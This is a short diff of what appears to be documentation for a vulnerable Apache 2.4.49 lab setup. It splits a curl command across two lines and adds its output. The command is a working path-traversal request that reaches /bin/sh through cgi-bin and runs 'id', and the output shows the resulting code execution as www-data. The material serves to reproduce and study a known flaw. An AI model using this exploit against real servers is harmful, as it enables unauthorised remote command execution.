@@ -52,7 +52,9 @@ RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1";
 - Version: `2.4.49`
 
 ```bash
-$ curl 'http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'
+$ curl 'http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' \
+    -d 'echo Content-Type: text/plain; echo; id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ## Resources
